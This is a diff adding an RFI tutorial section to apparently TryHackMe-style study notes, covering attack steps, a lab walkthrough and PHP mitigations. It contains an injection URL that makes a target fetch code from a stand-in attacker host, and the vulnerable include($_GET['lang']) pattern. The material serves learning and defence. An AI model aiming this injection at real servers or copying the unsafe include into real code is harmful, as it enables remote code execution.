@@ -330,3 +330,104 @@ You need to incorporate `languages/` into your payload:
 ---
 
 
+### Remote File Inclusion (RFI) 
+
+#### **Definition**:
+RFI is a technique that exploits vulnerable web applications by including external (remote) files through user input. If input is not sanitized properly, attackers can inject malicious URLs, resulting in server-side execution of the file's content.
+
+
+
+### **Requirements for RFI**
+1. **Improper Input Sanitization**: User input is not validated, allowing remote URLs.
+2. **`allow_url_fopen` Enabled**: The PHP configuration must allow the inclusion of remote files via URLs.
+
+
+### **Risks of RFI**
+- **Remote Command Execution (RCE)**: The attacker can execute malicious code on the server.
+- **Sensitive Information Disclosure**: Access to configuration files or sensitive server data.
+- **Cross-Site Scripting (XSS)**: Inject malicious scripts into a web application.
+- **Denial of Service (DoS)**: Overloading the server by including large files or malicious scripts.
+
+
+### **Steps for an RFI Attack**
+
+#### **1. Hosting a Malicious File**:
+- The attacker hosts a file on their own server.  
+  Example file `cmd.txt` hosted at `http://attacker.thm/cmd.txt`:
+  ```php
+  <?php echo "Hello THM"; ?>
+  ```
+
+#### **2. Injecting the Malicious URL**:
+- The attacker uses a vulnerable entry point in the target application, such as:
+  ```
+  http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt
+  ```
+
+#### **3. Server Fetches the Malicious File**:
+- The vulnerable application sends a `GET` request to the attacker's server to fetch `cmd.txt`.
+
+#### **4. Server Executes the Malicious File**:
+- The `include` function executes the content of `cmd.txt` on the target server:
+  ```php
+  include($_GET['lang']);
+  ```
+
+#### **5. Result**:
+- The output of the malicious file (e.g., `Hello THM`) is displayed on the vulnerable web page or executed on the server.
+
+
+### **RFI Lab**
+**Lab URL**: [http://10.10.150.74/playground.php](http://10.10.150.74/playground.php)
+
+#### **Steps to Perform RFI in the Lab**
+1. **Host a Malicious File**:
+   - Set up a simple web server to host your malicious file.  
+   - Use Python to host a file (optional):
+     ```bash
+     echo '<?php echo "Hello THM"; ?>' > cmd.txt
+     python3 -m http.server 80
+     ```
+   - The file will be accessible at `http://<YOUR-IP>/cmd.txt`.
+
+2. **Inject the URL**:
+   - Access the vulnerable application and inject your hosted file URL:
+     ```
+     http://10.10.150.74/playground.php?lang=http://<YOUR-IP>/cmd.txt
+     ```
+
+3. **Observe Execution**:
+   - Check the web page for the output (e.g., "Hello THM").
+   - Confirm that the file is executed on the server.
+
+
+
+### **Mitigation for RFI**
+1. **Disable `allow_url_fopen`**:
+   - Turn off remote file inclusion in PHP settings.
+     ```ini
+     allow_url_fopen = Off
+     ```
+
+2. **Input Validation**:
+   - Sanitize user inputs to allow only expected values.
+
+3. **Use Whitelisting**:
+   - Restrict input to a predefined set of allowed files or directories.
+
+4. **Least Privilege**:
+   - Limit server permissions to prevent execution of unauthorized code.
+
+5. **Web Application Firewall (WAF)**:
+   - Use WAFs to filter malicious inputs at the network level.
+
+
+### **Key Takeaways**
+- RFI is a critical vulnerability that can lead to RCE.
+- Understanding input sanitization and server-side behavior is crucial in exploiting and mitigating RFI.
+- Always ensure secure PHP configurations and sanitize all user inputs.
+
+---
+---
+
+
